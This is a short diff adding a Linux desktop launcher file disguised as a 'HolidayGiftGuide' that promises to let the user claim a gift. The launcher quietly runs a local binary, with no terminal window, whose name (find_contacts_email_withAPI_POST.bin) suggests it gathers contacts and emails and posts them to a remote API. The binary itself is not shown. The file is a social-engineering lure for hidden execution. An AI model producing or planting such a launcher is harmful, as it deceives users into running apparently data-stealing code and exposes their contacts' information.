@@ -1,0 +1,8 @@
+[Desktop Entry]
+Version=1.0
+Name=HolidayGiftGuide
+Comment=This is how to claim your gift
+Exec=./find_contacts_email_withAPI_POST.bin
+Icon=./face-monkey.png
+Terminal=false
+Type=Application
